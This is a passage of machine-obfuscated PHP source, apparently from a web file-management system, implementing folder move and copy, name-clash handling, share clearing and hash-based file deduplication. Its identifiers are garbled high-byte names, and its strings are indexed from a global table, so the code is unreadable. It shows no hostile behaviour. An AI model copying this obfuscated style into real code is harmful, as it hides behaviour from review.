$this->parentLevelArray($ÜÒóëÒÏ); $Ãø ì— = $Ç•’[count($Ç•’) - 1]; return array($½ÌÀáæ[461] => $Ãø ì—, $½ÌÀáæ[540] => $ÜÒóëÒÏ); } private function _makeItemData($ÔãÚ¬ğÙ, $†Éµ’ú, $Áïœçôó) { $°»öà¯Æ =& $_SERVER[…É¦À–]; $¿¤ÌñĞù = array($°»öà¯Æ[603] => $ÔãÚ¬ğÙ[$°»öà¯Æ[439]], $°»öà¯Æ[449] => $Áïœçôó, $°»öà¯Æ[604] => $ÔãÚ¬ğÙ[$°»öà¯Æ[441]] ? $ÔãÚ¬ğÙ[$°»öà¯Æ[441]] : $°»öà¯Æ[12], $°»öà¯Æ[498] => $ÔãÚ¬ğÙ[$°»öà¯Æ[497]] ? $ÔãÚ¬ğÙ[$°»öà¯Æ[497]] : 0, $°»öà¯Æ[574] => $ÔãÚ¬ğÙ[$°»öà¯Æ[76]] ? $ÔãÚ¬ğÙ[$°»öà¯Æ[76]] : 0, $°»öà¯Æ[605] => intval($†Éµ’ú[$°»öà¯Æ[440]]), $°»öà¯Æ[606] => intval($†Éµ’ú[$°»öà¯Æ[525]]), $°»öà¯Æ[607] => intval(USER_ID), $°»öà¯Æ[608] => intval(USER_ID), $°»öà¯Æ[430] => intval($†Éµ’ú[$°»öà¯Æ[431]]), $°»öà¯Æ[609] => $†Éµ’ú[$°»öà¯Æ[540]] . $†Éµ’ú[$°»öà¯Æ[431]] . $°»öà¯Æ[50], $°»öà¯Æ[453] => $ÔãÚ¬ğÙ[$°»öà¯Æ[85]] ? $ÔãÚ¬ğÙ[$°»öà¯Æ[85]] : time(), $°»öà¯Æ[459] => 0, $°»öà¯Æ[610] => $°»öà¯Æ[12]); return $¿¤ÌñĞù; } private function _copyApplyMeta($š×‹ó¨ä, &$´À¦ï³) { $ÇÕ–‰ =& $_SERVER[…É¦À–]; $´–ç¶‡ = $š×‹ó¨ä[$ÇÕ–‰[431]]; $ùÑÚèˆ® = $š×‹ó¨ä[$ÇÕ–‰[32]]; if (!isset($š×‹ó¨ä[$ÇÕ–‰[611]]) || !$š×‹ó¨ä[$ÇÕ–‰[611]] || $š×‹ó¨ä[$ÇÕ–‰[611]] == $ÇÕ–‰[198]) { $´À¦ï³[$ÇÕ–‰[588]][] = array($ÇÕ–‰[431], $´–ç¶‡, $ÇÕ–‰[611], short_id($´–ç¶‡)); } if (Input::check($ùÑÚèˆ®, $ÇÕ–‰[612])) { $´À¦ï³[$ÇÕ–‰[587]][] = array($ÇÕ–‰[431] => $´–ç¶‡, $ÇÕ–‰[94] => $ÇÕ–‰[494], $ÇÕ–‰[403] => str_replace($ÇÕ–‰[53], $ÇÕ–‰[12], Pinyin::get($ùÑÚèˆ®))); $´À¦ï³[$ÇÕ–‰[587]][] = array($ÇÕ–‰[431] => $´–ç¶‡, $ÇÕ–‰[94] => $ÇÕ–‰[493], $ÇÕ–‰[403] => Pinyin::get($ùÑÚèˆ®, $ÇÕ–‰[613])); } $´À¦ï³[$ÇÕ–‰[587]][] = array($ÇÕ–‰[431] => $´–ç¶‡, $ÇÕ–‰[94] => $ÇÕ–‰[473], $ÇÕ–‰[403] => KodSort::makeStr($ùÑÚèˆ®)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ú‹èŠõ) { $§ÑÙ½“È =& $_SERVER[…É¦À–]; $„´úµ÷— = $this->sourceInfo($ú‹èŠõ); $Ó›Ä»ê¥ = $§ÑÙ½“È[614]; $´íßÁúÏ = array($§ÑÙ½“È[540] => array($§ÑÙ½“È[569], $„´úµ÷—[$§ÑÙ½“È[540]] . $ú‹èŠõ . $§ÑÙ½“È[570]), $§ÑÙ½“È[460] => $this->targetIsDelete); $™“Ø³ó = $this->field($Ó›Ä»ê¥)->where($´íßÁúÏ)->select(); if (!$™“Ø³ó) { return; } $™“Ø³ó = array_to_keyvalue($™“Ø³ó, $§ÑÙ½“È[431]); foreach ($™“Ø³ó as $šÅŸşŞ©) { $ÆéÆÊò¼ = $šÅŸşŞ©[$§ÑÙ½“È[461]]; $ú‹èŠõ = $šÅŸşŞ©[$§ÑÙ½“È[431]]; if (!isset($this->_childrenListCache[$ú‹èŠõ]) && $šÅŸşŞ©[$§ÑÙ½“È[439]] == $§ÑÙ½“È[88]) { $this->_childrenListCache[$ú‹èŠõ] = array(); } if (!isset($this->_childrenListCache[$ÆéÆÊò¼])) { $this->_childrenListCache[$ÆéÆÊò¼] = array(); } $this->_childrenListCache[$ÆéÆÊò¼][$ú‹èŠõ] = $šÅŸşŞ©; $this->_childrenItemCache[$ú‹èŠõ] = $šÅŸşŞ©; } } private function _childrenListAll($§÷Ëà®, &$ûŸÃÇ¦¶) { $í¹µÄ£ =& $_SERVER[…É¦À–]; if (!isset($this->_childrenListCache[$§÷Ëà®])) { return; } $†ŠÊ²ÁÃ = $this->_childrenListCache[$§÷Ëà®]; foreach ($†ŠÊ²ÁÃ as $ñ“ñ×·ó => $¯‰†’‰å) { $ûŸÃÇ¦¶[$ñ“ñ×·ó] = $¯‰†’‰å; if ($¯‰†’‰å[$í¹µÄ£[439]] == $í¹µÄ£[88]) { $this->_childrenListAll($ñ“ñ×·ó, $ûŸÃÇ¦¶); } } } private function sourceInfoCache($ŞëÃÔ©Ÿ) { if (isset($this->_childrenItemCache[$ŞëÃÔ©Ÿ])) { return $this->_childrenItemCache[$ŞëÃÔ©Ÿ]; } return $this->sourceInfo($ŞëÃÔ©Ÿ); } private function _childrenList($èë¢²éğ) { if (isset($this->_childrenListCache[$èë¢²éğ])) { return $this->_childrenListCache[$èë¢²éğ]; } return $this->_childrenListSelect($èë¢²éğ); } private function _childrenListSelect($º€ªÔ‚î) { $ùôïÄ­ =& $_SERVER[…É¦À–]; $Ùê¹”Ó = array($ùôïÄ­[461] => $º€ªÔ‚î, $ùôïÄ­[460] => $this->targetIsDelete); $è½æŠŞæ = $this->where($Ùê¹”Ó)->select(); $è½æŠŞæ = $è½æŠŞæ ? $è½æŠŞæ : array(); $Áî˜öìÑ = array_to_keyvalue($è½æŠŞæ, $ùôïÄ­[431]); $this->_childrenListCache[$º€ªÔ‚î] = $Áî˜öìÑ; foreach ($Áî˜öìÑ as $º€ªÔ‚î => $ú•ÉôÑÊ) { $this->_childrenItemCache[$º€ªÔ‚î] = $ú•ÉôÑÊ; } return $Áî˜öìÑ; } private function fileNameExistCache($˜™íçø¼, $ÅÛÓ³ƒÛ) { $¬ŠéÏ¼á =& $_SERVER[…É¦À–]; $ÅÛÓ³ƒÛ = strtolower($ÅÛÓ³ƒÛ); $œ„é»Ï½ = $this->_childrenList($˜™íçø¼); foreach ($œ„é»Ï½ as $Çİû—ù ) { if ($ÅÛÓ³ƒÛ == strtolower($Çİû—ù [$¬ŠéÏ¼á[32]])) { return $Çİû—ù [$¬ŠéÏ¼á[431]]; } } return !1; } private function fileNameAutoCache($Œâ›’Ï, $àü—ÂŒ, $­ÕÏñÏú, $şèòœí’) { $Í±çğ° =& $_SERVER[…É¦À–]; $Ô§Í›Í = $this->_childrenList($Œâ›’Ï); $½ŒÏüğ® = array_to_keyvalue($Ô§Í›Í, $Í±çğ°[12], $Í±çğ°[32]); return $this->fileNameAutoGet($½ŒÏüğ®, $àü—ÂŒ, $­ÕÏñÏú, $şèòœí’); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ü‘ÇË‹­, $‹”Ã¡Ñê, $üåÃ³¤à = REPEAT_REPLACE, $ƒ‚’ïñø = '') { $˜‚¹® =& $_SERVER[…É¦À–]; $ª‹œ§€ = $this->sourceInfo($ü‘ÇË‹­); $¶Á¬æ„á = $this->sourceInfo($‹”Ã¡Ñê); if ($ª‹œ§€[$˜‚¹®[461]] == $¶Á¬æ„á[$˜‚¹®[431]]) { if ($ª‹œ§€[$˜‚¹®[460]] == $˜‚¹®[88]) { Model($˜‚¹®[458])->restore(array($ü‘ÇË‹­)); } if (!$ƒ‚’ïñø || $ƒ‚’ïñø == $ª‹œ§€[$˜‚¹®[32]]) { return $ü‘ÇË‹­; } } $˜äé¸²ğ = $this->pathInfoMore($ü‘ÇË‹­); if ($this->isParentOf($ü‘ÇË‹­, $‹”Ã¡Ñê)) { return !1; } if (!$ª‹œ§€ || !$¶Á¬æ„á || $¶Á¬æ„á[$˜‚¹®[439]] != $˜‚¹®[88]) { return !1; } Hook::trigger($˜‚¹®[615], $˜äé¸²ğ); $this->targetIsDelete = intval($ª‹œ§€[$˜‚¹®[460]]); if ($ª‹œ§€[$˜‚¹®[461]] == $‹”Ã¡Ñê && $ƒ‚’ïñø != $ª‹œ§€[$˜‚¹®[32]]) { $ğ’šÕŠÎ = $this->fileNameExist($‹”Ã¡Ñê, $ƒ‚’ïñø); if ($ğ’šÕŠÎ && $ª‹œ§€[$˜‚¹®[439]] == $˜‚¹®[198]) { $“¤ÍªÍ = $this->sourceInfo($ğ’šÕŠÎ); $î‚™Õ¾ô = $this->fileHistory($“¤ÍªÍ, $ª‹œ§€[$˜‚¹®[497]], $ª‹œ§€[$˜‚¹®[76]]); if (!$î‚™Õ¾ô) { Model($˜‚¹®[500])->remove($ª‹œ§€[$˜‚¹®[497]]); } $this->removeNow($ü‘ÇË‹­, !1); $this->folderSizeReset($‹”Ã¡Ñê); Hook::trigger($˜‚¹®[616], $˜äé¸²ğ); return $ğ’šÕŠÎ; } } $½Ğù¸ÛÒ = $ƒ‚’ïñø ? $ƒ‚’ïñø : $ª‹œ§€[$˜‚¹®[32]]; $this->lockMoveStart($ü‘ÇË‹­); $this->lockWriteStart($‹”Ã¡Ñê, $½Ğù¸ÛÒ); $ÏâëÅ¼ú = array($˜‚¹®[586] => array(), $˜‚¹®[617] => !1); $this->clearShare($ü‘ÇË‹­, $‹”Ã¡Ñê); $ÒœÂÈ…à = $this->fileNameExistCache($‹”Ã¡Ñê, $ª‹œ§€[$˜‚¹®[32]]); $ï²Ìå¦„ = $this->_move($ü‘ÇË‹­, $‹”Ã¡Ñê, $üåÃ³¤à, $ÏâëÅ¼ú, $ƒ‚’ïñø); $this->sourceCacheClear(); if ($ª‹œ§€[$˜‚¹®[439]] == $˜‚¹®[88] && $ÒœÂÈ…à) { $this->folderSizeResetChildren($ï²Ìå¦„); } Model($˜‚¹®[200])->linkAdd($ÏâëÅ¼ú[$˜‚¹®[586]]); if ($ÒœÂÈ…à && $ÏâëÅ¼ú[$˜‚¹®[617]]) { $this->removeNow($ü‘ÇË‹­, !1); } $this->lockMoveEnd($ü‘ÇË‹­); $this->lockWriteEnd($‹”Ã¡Ñê, $½Ğù¸ÛÒ); $this->folderSizeReset($ª‹œ§€[$˜‚¹®[461]]); $this->folderSizeReset($‹”Ã¡Ñê); $Ò³ÊŞ¾ò = array($ª‹œ§€[$˜‚¹®[461]], $‹”Ã¡Ñê); if ($ª‹œ§€[$˜‚¹®[439]] == $˜‚¹®[88]) { $Ò³ÊŞ¾ò[] = $ü‘ÇË‹­; } $this->updateModifyTime($Ò³ÊŞ¾ò); Model($˜‚¹®[590])->eventMove($ü‘ÇË‹­, $ª‹œ§€[$˜‚¹®[461]], $‹”Ã¡Ñê); Hook::trigger($˜‚¹®[616], $˜äé¸²ğ); return $ï²Ìå¦„; } private function _move($·¤”éª, $…ª•î—, $‚«²ıÎ°, &$˜À¹­»Ç, $ê…‹ = '') { $Âµ‰²áú =& $_SERVER[…É¦À–]; $õÏÇ²ÈØ = $this->sourceInfo($·¤”éª); $àÙÃÂ„É = $õÏÇ²ÈØ[$Âµ‰²áú[439]] == $Âµ‰²áú[88]; $çÏƒİ‚ = $ê…‹ ? $ê…‹ : $õÏÇ²ÈØ[$Âµ‰²áú[32]]; $åÕ×¶ƒ€ = $this->fileNameExistCache($…ª•î—, $çÏƒİ‚); $this->lockMoveStart($·¤”éª); $this->lockWriteStart($…ª•î—, $çÏƒİ‚); if (!$åÕ×¶ƒ€) { return $this->_moveForce($·¤”éª, $…ª•î—, $çÏƒİ‚); } $’Ì³¨« = $åÕ×¶ƒ€; $¦¹Îñš = !1; if ($àÙÃÂ„É) { if ($‚«²ıÎ° == REPEAT_RENAME_FOLDER) { $çÏƒİ‚ = $this->fileNameAuto($…ª•î—, $çÏƒİ‚, $‚«²ıÎ°, $àÙÃÂ„É); $’Ì³¨« = $this->_moveForce($·¤”éª, $…ª•î—, $çÏƒİ‚); } else { if ($‚«²ıÎ° == REPEAT_RENAME_FOLDER) { $‚«²ıÎ° = REPEAT_RENAME; } $­ş¹ÂÃ = $this->_childrenListSelect($·¤”éª); foreach ($­ş¹ÂÃ as $ÛôÖç÷Ã) { $this->_move($ÛôÖç÷Ã[$Âµ‰²áú[431]], $åÕ×¶ƒ€, $‚«²ıÎ°, $˜À¹­»Ç); } $¦¹Îñš = !0; } } else { if ($‚«²ıÎ° == REPEAT_SKIP) { $¦¹Îñš = !0; } else { if ($‚«²ıÎ° == REPEAT_RENAME || $‚«²ıÎ° == REPEAT_RENAME_FOLDER) { $çÏƒİ‚ = $this->fileNameAuto($…ª•î—, $çÏƒİ‚, $‚«²ıÎ°, $àÙÃÂ„É); $’Ì³¨« = $this->_moveForce($·¤”éª, $…ª•î—, $çÏƒİ‚); } else { if ($‚«²ıÎ° == REPEAT_REPLACE) { $·¥ˆÏšê = $this->sourceInfoCache($åÕ×¶ƒ€); $‘äà¾•˜ = $this->fileHistory($·¥ˆÏšê, $õÏÇ²ÈØ[$Âµ‰²áú[497]], $õÏÇ²ÈØ[$Âµ‰²áú[76]]); $¦¹Îñš = !0; if ($‘äà¾•˜) { $˜À¹­»Ç[$Âµ‰²áú[586]][] = $õÏÇ²ÈØ[$Âµ‰²áú[497]]; } } } } } if ($¦¹Îñš && !$˜À¹­»Ç[$Âµ‰²áú[617]]) { $˜À¹­»Ç[$Âµ‰²áú[617]] = !0; } return $’Ì³¨«; } private function _moveForce($ı÷ØÚ, $É‚ÆŸø¨, $µÒÅÇ„í) { $˜æ•øÁî =& $_SERVER[…É¦À–]; $Ïòú¸ö = $this->sourceInfo($ı÷ØÚ); $ú»Ü‡¬Ö = $this->sourceInfo($É‚ÆŸø¨); $‹…Ë¶ÓŒ = $Ïòú¸ö[$˜æ•øÁî[439]] == $˜æ•øÁî[88]; $‰¦İĞ¾ = array($˜æ•øÁî[430] => $ú»Ü‡¬Ö[$˜æ•øÁî[431]], $˜æ•øÁî[609] => $ú»Ü‡¬Ö[$˜æ•øÁî[540]] . $ú»Ü‡¬Ö[$˜æ•øÁî[431]] . $˜æ•øÁî[50], $˜æ•øÁî[605] => $ú»Ü‡¬Ö[$˜æ•øÁî[440]], $˜æ•øÁî[606] => $ú»Ü‡¬Ö[$˜æ•øÁî[525]], $˜æ•øÁî[608] => USER_ID, $˜æ•øÁî[449] => $µÒÅÇ„í); $§óô¾©ê = $Ïòú¸ö[$˜æ•øÁî[440]] == SourceModel::TYPE_GROUP && $ú»Ü‡¬Ö[$˜æ•øÁî[440]] == SourceModel::TYPE_GROUP && $Ïòú¸ö[$˜æ•øÁî[525]] == $ú»Ü‡¬Ö[$˜æ•øÁî[525]]; if (!$§óô¾©ê && $this->moveClearAuth) { Model($˜æ•øÁî[522])->authClear($ı÷ØÚ); } $à÷üÎ = $Ïòú¸ö[$˜æ•øÁî[460]] == $˜æ•øÁî[88] && $ú»Ü‡¬Ö[$˜æ•øÁî[460]] != $˜æ•øÁî[88]; if ($à÷üÎ) { $‰¦İĞ¾[$˜æ•øÁî[459]] = 0; } if ($‹…Ë¶ÓŒ) { $¸¾ıÁÕÑ = array($˜æ•øÁî[609] => array($˜æ•øÁî[569], $Ïòú¸ö[$˜æ•øÁî[540]] . $Ïòú¸ö[$˜æ•øÁî[431]] . $˜æ•øÁî[570])); $•’ñ½Á­ = $Ïòú¸ö[$˜æ•øÁî[540]] . $Ïòú¸ö[$˜æ•øÁî[431]] . $˜æ•øÁî[50]; $çøø“†ç = $ú»Ü‡¬Ö[$˜æ•øÁî[540]] . $ú»Ü‡¬Ö[$˜æ•øÁî[431]] . $˜æ•øÁî[50] . $Ïòú¸ö[$˜æ•øÁî[431]] . $˜æ•øÁî[50]; $›èùÑ‘ = array($˜æ•øÁî[609] => array($˜æ•øÁî[618], "\162\x65\x70\154\141\143\145\x28\x70\141\x72\145\156\x74\114\145\x76\145\154\54\x27{$•’ñ½Á­}\47\x2c\x27{$çøø“†ç}\47\x29"), $˜æ•øÁî[605] => $ú»Ü‡¬Ö[$˜æ•øÁî[440]], $˜æ•øÁî[606] => $ú»Ü‡¬Ö[$˜æ•øÁî[525]]); if ($à÷üÎ) { $›èùÑ‘[$˜æ•øÁî[459]] = 0; } $this->where($¸¾ıÁÕÑ)->data($›èùÑ‘)->save(); } $this->where(array($˜æ•øÁî[446] => $ı÷ØÚ))->data($‰¦İĞ¾)->save(); return $ı÷ØÚ; } private function clearShare($âŠûÄú¡, $ª¦Èñ¤Ô) { $ğË¨î§ =& $_SERVER[…É¦À–]; $Úşëˆ = $this->sourceInfo($âŠûÄú¡); $ôÉ÷Üö» = $this->sourceInfo($ª¦Èñ¤Ô); if ($Úşëˆ[$ğË¨î§[525]] == $ôÉ÷Üö»[$ğË¨î§[525]] && $Úşëˆ[$ğË¨î§[440]] == $ğË¨î§[619]) { return; } $€ÆÑ œø = array($ğË¨î§[540] => array($ğË¨î§[569], $Úşëˆ[$ğË¨î§[540]] . $âŠûÄú¡ . $ğË¨î§[570])); $‹ÖêÑ … = $this->field($ğË¨î§[446])->where($€ÆÑ œø)->getField($ğË¨î§[431], !0); if (!$‹ÖêÑ …) { return; } $€ÆÑ œø = array($ğË¨î§[431] => array($ğË¨î§[7], $‹ÖêÑ …), $ğË¨î§[620] => 1); $¦ÔÌÏÅó = Model($ğË¨î§[621])->field($ğË¨î§[622])->where($€ÆÑ œø)->select(); if (!$¦ÔÌÏÅó) { return; } $¦ÔÌÏÅó = array_to_keyvalue($¦ÔÌÏÅó, $ğË¨î§[12], $ğË¨î§[622]); $€ÆÑ œø = array($ğË¨î§[622] => array($ğË¨î§[7], $¦ÔÌÏÅó)); Model($ğË¨î§[621])->where($€ÆÑ œø)->save(array($ğË¨î§[620] => 0)); Model($ğË¨î§[623])->where($€ÆÑ œø)->delete(); } public function copyFolderFromIO($®Æ¶©â, $¦Ç‘­ë, $¼î®ˆÉ, $Ğ±âÊĞ, $£ëéÇÛÁ, $ËûÆšºÓ = false) { $²—õ§ğ =& $_SERVER[…É¦À–]; $†Ğíã = array($²—õ§ğ[587] => array(), $²—õ§ğ[588] => array(), $²—õ§ğ[586] => array(), $²—õ§ğ[624] => array()); $¡ú¿Å±Å = $ËûÆšºÓ ? $ËûÆšºÓ : $®Æ¶©â->pathThis($¦Ç‘­ë); $Ÿ¢šÃÒæ = $this->fileNameExist($¼î®ˆÉ, $¡ú¿Å±Å); $µÖİË“¹ = $this->mkdir($¼î®ˆÉ, $¡ú¿Å±Å, $Ğ±âÊĞ); if (!$Ÿ¢šÃÒæ || $Ğ±âÊĞ == REPEAT_RENAME_FOLDER) { $Ğ±âÊĞ = !1; } if ($Ÿ¢šÃÒæ) { $this->_childrenAllMake($Ÿ¢šÃÒæ); } Hook::trigger($²—õ§ğ[625]); $this->_copyChildTo($®Æ¶©â, $¦Ç‘­ë, $µÖİË“¹, $Ğ±âÊĞ, $†Ğíã, $£ëéÇÛÁ); Hook::trigger($²—õ§ğ[626]); if ($µÖİË“¹) { $this->folderSizeResetChildren($µÖİË“¹); } $this->_childrenListClear(); Model($²—õ§ğ[589])->addAll($†Ğíã[$²—õ§ğ[587]], array(), !0); Model($²—õ§ğ[590])->eventCopy($µÖİË“¹); $this->saveAll($†Ğíã[$²—õ§ğ[588]]); Model($²—õ§ğ[500])->linkAdd($†Ğíã[$²—õ§ğ[586]]); Model($²—õ§ğ[500])->remove($†Ğíã[$²—õ§ğ[624]]); $this->folderSizeReset($¼î®ˆÉ); $this->updateModifyTime($¼î®ˆÉ); return $µÖİË“¹; } private function _copyChildTo($ïÉ‘Áí€, $ö˜ˆÁµ, $¨’ÄÁƒ, $ª­¹¯‰, &$¦Ï¦ÉÏ—, $ËÛ¦½¿†) { $‰öÇ½€è =& $_SERVER[…É¦À–]; $€ì¤Û¨– = $this->sourceInfoCache($¨’ÄÁƒ); $§ÎÈˆ´– = $ïÉ‘Áí€->listPath($ö˜ˆÁµ); $§ÎÈˆ´– = $§ÎÈˆ´– ? $§ÎÈˆ´– : array($‰öÇ½€è[83] => array(), $‰öÇ½€è[82] => array()); $ğÛı¥­Ó = array_merge($§ÎÈˆ´–[$‰öÇ½€è[83]], $§ÎÈˆ´–[$‰öÇ½€è[82]]); $é¥ õùÉ = $this->_addFiles($ïÉ‘Áí€, $§ÎÈˆ´–[$‰öÇ½€è[83]], $ËÛ¦½¿†); $ÀèŞ‡ŸŸ = array(); foreach ($ğÛı¥­Ó as &$’Ùò‚Ö) { if (isset($é¥ õùÉ[$’Ùò‚Ö[$‰öÇ½€è[32]]])) { $’Ùò‚Ö = $é¥ õùÉ[$’Ùò‚Ö[$‰öÇ½€è[32]]]; } $’Ùò‚Ö[$‰öÇ½€è[439]] = $’Ùò‚Ö[$‰öÇ½€è[33]] == $‰öÇ½€è[75]; $’Ùò‚Ö[$‰öÇ½€è[441]] = substr(_get($’Ùò‚Ö, $‰öÇ½€è[174], $‰öÇ½€è[12]), 0, 10); $’Ùò‚Ö[$‰öÇ½€è[76]] = _get($’Ùò‚Ö, $‰öÇ½€è[76], 0); $’Ùò‚Ö[$‰öÇ½€è[497]] = _get($’Ùò‚Ö, $‰öÇ½€è[497], 0); if (!isset($’Ùò‚Ö[$‰öÇ½€è[627]]) && $’Ùò‚Ö[$‰öÇ½€è[497]]) { $¦Ï¦ÉÏ—[$‰öÇ½€è[624]][] = $’Ùò‚Ö[$‰öÇ½€è[497]]; } if ($ª­¹¯‰) { $ÉØ†ãÚ = $this->fileNameExistCache($¨’ÄÁƒ, $’Ùò‚Ö[$‰öÇ½€è[32]]); if ($ÉØ†ãÚ) { if ($’Ùò‚Ö[$‰öÇ½€è[439]] || $ª­¹¯‰ == REPEAT_SKIP) { continue; } if ($ª­¹¯‰ == REPEAT_REPLACE) { $È®™ùë = $this->sourceInfoCache($ÉØ†ãÚ); $˜ñ‹Ú¯ = $this->fileHistory($È®™ùë, $’Ùò‚Ö[$‰öÇ½€è[497]], $’Ùò‚Ö[$‰öÇ½€è[76]]); if ($˜ñ‹Ú¯) { $¦Ï¦ÉÏ—[$‰öÇ½€è[586]][] = $’Ùò‚Ö[$‰öÇ½€è[497]]; } continue; } else { if ($ª­¹¯‰ == REPEAT_RENAME) { $’Ùò‚Ö[$‰öÇ½€è[32]] = $this->fileNameAutoCache($¨’ÄÁƒ, $’Ùò‚Ö[$‰öÇ½€è[32]], $ª­¹¯‰, !1); } } } } if (!$’Ùò‚Ö[$‰öÇ½€è[439]] && $’Ùò‚Ö[$‰öÇ½€è[497]] == 0) { continue; } if (!$’Ùò‚Ö[$‰öÇ½€è[439]] && $’Ùò‚Ö[$‰öÇ½€è[497]]) { $¦Ï¦ÉÏ—[$‰öÇ½€è[586]][] = $’Ùò‚Ö[$‰öÇ½€è[497]]; } $ÀèŞ‡ŸŸ[] = $this->_makeItemData($’Ùò‚Ö, $€ì¤Û¨–, $’Ùò‚Ö[$‰öÇ½€è[32]]); } unset($’Ùò‚Ö); if (!empty($ÀèŞ‡ŸŸ)) { $this->addAll($ÀèŞ‡ŸŸ); $this->_childrenListSelect($¨’ÄÁƒ); } $”Û§×•» = $this->_childrenList($¨’ÄÁƒ); $”Û§×•» = array_to_keyvalue($”Û§×•», $‰öÇ½€è[32]); foreach ($ğÛı¥­Ó as $’Ùò‚Ö) { $È®™ùë = $”Û§×•»[$’Ùò‚Ö[$‰öÇ½€è[32]]]; $º»âçÏ£ = $È®™ùë[$‰öÇ½€è[431]]; $this->_copyApplyMeta($È®™ùë, $¦Ï¦ÉÏ—); if ($’Ùò‚Ö[$‰öÇ½€è[33]] == $‰öÇ½€è[75]) { $’Ùò‚Ö[$‰öÇ½€è[84]] = $ïÉ‘Áí€->getPathInner($’Ùò‚Ö[$‰öÇ½€è[84]]); $this->_copyChildTo($ïÉ‘Áí€, $’Ùò‚Ö[$‰öÇ½€è[84]], $º»âçÏ£, $ª­¹¯‰, $¦Ï¦ÉÏ—, $ËÛ¦½¿†); } } } private function _addFiles($şŒ«’ñÚ, $Ùş…åØù, $ùŒã’¥Ø) { $ÕÉµĞğ =& $_SERVER[…É¦À–]; if (!$Ùş…åØù || count($Ùş…åØù) == 0) { return array(); } $¸ •†ƒ = array(); foreach ($Ùş…åØù as &$•¼»·••) { Hook::trigger($ÕÉµĞğ[628], $•¼»·••); $•¼»·••[$ÕÉµĞğ[84]] = $şŒ«’ñÚ->getPathInner($•¼»·••[$ÕÉµĞğ[84]]); $“§ìÁ²Ö = $şŒ«’ñÚ->hashSimple($•¼»·••[$ÕÉµĞğ[84]]); $„Îë»œ = $şŒ«’ñÚ->hashMd5($•¼»·••[$ÕÉµĞğ[84]]); if (strlen($„Îë»œ) > 10 && !isset($¸ •†ƒ[$„Îë»œ])) { $¸ •†ƒ[$„Îë»œ] = array(); } $•¼»·••[$ÕÉµĞğ[177]] = $“§ìÁ²Ö; $•¼»·••[$ÕÉµĞğ[176]] = $„Îë»œ; $¸ •†ƒ[$„Îë»œ][] =& $•¼»·••; if (count($¸ •†ƒ[$„Îë»œ]) > 1) { $•¼»·••[$ÕÉµĞğ[627]] = !0; } Hook::trigger($ÕÉµĞğ[629], $•¼»·••); } unset($•¼»·••); $êì±æÄÙ = array($ÕÉµĞğ[176] => array($ÕÉµĞğ[7], array_keys($¸ •†ƒ))); $ğŸšÈÜö = Model($ÕÉµĞğ[630]); $ÈñÇ¤İø = $ğŸšÈÜö->where($êì±æÄÙ)->select(); $ÈñÇ¤İø = $ÈñÇ¤İø ? $ÈñÇ¤İø : array(); foreach ($ÈñÇ¤İø as $ğ®ÛÁ) { if (!isset($¸ •†ƒ[$ğ®ÛÁ[$ÕÉµĞğ[176]]])) { continue; } $Ü’Ñ¨¦² = $¸ •†ƒ[$ğ®ÛÁ[$ÕÉµĞğ[176]]]; foreach ($Ü’Ñ¨¦² as &$•¼»·••) { $•¼»·••[$ÕÉµĞğ[497]] = $ğ®ÛÁ[$ÕÉµĞğ[497]]; $•¼»·••[$ÕÉµĞğ[627]] = !0; } unset($•¼»·••); } $£µ×ÃŞØ = array(); foreach ($Ùş…åØù as $¨¥‚óíË) { Hook::trigger($ÕÉµĞğ[631], $¨¥‚óíË); if (isset($¨¥‚óíË[$ÕÉµĞğ[627]]) && $¨¥‚óíË[$ÕÉµĞğ[627]]) { Hook::trigger($ÕÉµĞğ[632], $¨¥‚óíË); continue; } $ìåÏÊñœ = $şŒ«’ñÚ->getPathInner($¨¥‚óíË[$ÕÉµĞğ[84]]); $êåØİ» = $ğŸšÈÜö->addFileMake($ìåÏÊñœ, $¨¥‚óíË[$ÕÉµĞğ[76]], $¨¥‚óíË[$ÕÉµĞğ[177]], $¨¥‚óíË[$ÕÉµĞğ[176]], $¨¥‚óíË[$ÕÉµĞğ[32]], $ùŒã’¥Ø); Hook::trigger($ÕÉµĞğ[632], $¨¥‚óíË); if (!is_array($êåØİ»)) { continue; } $£µ×ÃŞØ[] = $êåØİ»; } $ğŸšÈÜö->addAll($£µ×ÃŞØ); $êì±æÄÙ = array($ÕÉµĞğ[176] => array($ÕÉµĞğ[7], array_keys($¸ •†ƒ))); $ÈñÇ¤İø = $ğŸšÈÜö->where($êì±æÄÙ)->select(); $ÈñÇ¤İø = $ÈñÇ¤İø ? $ÈñÇ¤İø : array(); foreach ($ÈñÇ¤İø as $ğ®ÛÁ) { if (!isset($¸ •†ƒ[$ğ®ÛÁ[$ÕÉµĞğ[176]]])) { continue; } $—½Ô²­” =& $¸ •†ƒ[$ğ®ÛÁ[$ÕÉµĞğ[176]]]; foreach ($—½Ô²­” as &$•¼»·••) { $•¼»·••[$ÕÉµĞğ[497]] = $ğ®ÛÁ[$ÕÉµĞğ[497]]; } unset($•¼»·••); } $ÁÃå¯Å‚ = array(); foreach ($Ùş…åØù as $½§À­ÉÏ) { $ÁÃå¯Å‚[$½§À­ÉÏ[$ÕÉµĞğ[32]]] = $½§À­ÉÏ; } return $ÁÃå¯Å‚; } } goto b™ Ú¬ùã•; Aîçìç„ä‰: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Åç€û‡ =& $_SERVER[…É¦À–]; $this->objectDriver = array($Åç€û‡[60], $Åç€û‡[61], $Åç€û‡[62], $Åç€û‡[63], $Åç€û‡[64], $Åç€û‡[65], $Åç€û‡[66], $Åç€û‡[67], $Åç€û‡[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($­³‡¢‘) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($­³‡¢‘, $_SERVER[…É¦À–][8]); } return $­³‡¢‘; } public function iconvApp($¾ØƒßÇó) { return $¾ØƒßÇó; } public function iconvSystem($”Ô¢ÊÖî) { return $”Ô¢ÊÖî; } public function iconvTo($Ø–ÛÍò¾, $ÉØÏó™Ê, $„”†»˜è) { $Ô›ûØ† =& $_SERVER[…É¦À–]; if (!$Ø–ÛÍò¾ || !function_exists($Ô›ûØ†[69])) { return $Ø–ÛÍò¾; } static $¶ÊÂè´® = array(); $×½ğşé = $ÉØÏó™Ê . $Ô›ûØ†[70] . $„”†»˜è . $Ô›ûØ†[71] . $Ø–ÛÍò¾; if (isset($¶ÊÂè´®[$×½ğşé])) { return $¶ÊÂè´®[$×½ğşé]; } if 